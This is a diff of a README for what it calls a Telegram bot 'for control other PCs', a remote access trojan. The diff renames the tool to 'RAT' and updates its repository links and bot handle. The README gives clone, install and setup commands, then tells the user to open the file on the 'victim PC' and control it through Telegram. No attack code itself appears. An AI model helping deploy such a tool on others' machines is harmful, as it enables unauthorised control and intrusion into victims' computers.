@@ -1,15 +1,15 @@
-# Meta Sploit Telegram (MS-TL) 
-MS TL is a telegram bot for control other PCs.
+# Meta Sploit Telegram (RAT) 
+RAT TL is a telegram bot for control other PCs.
 <img src="Files/first.jpeg" />
 
 # installing
 
-## First, you should install <a href="https://github.com/Unknow-per/Its_Hub-Library/"> Its_Hub Library </a>.
+## First, you should install <a href="https://github.com/Farbod-Parkhooi/Its_Hub-Library/"> Its_Hub Library </a>.
 
 ```
-git clone https://github.com/Unknow-per/MS-TL/
+git clone https://github.com/Farbod-Parkhooi/RAT/
 
-cd MS-TL
+cd RAT
 
 pip install -r requirements.txt
 
@@ -20,7 +20,7 @@ python setup.py
 <p>
 after complete setup.py:
 
-start MS TL bot in telegram(@msftlbot)
+start RAT TL bot in telegram(@RATftlbot)
 
 open file in victim PC. and go to telegram.
 
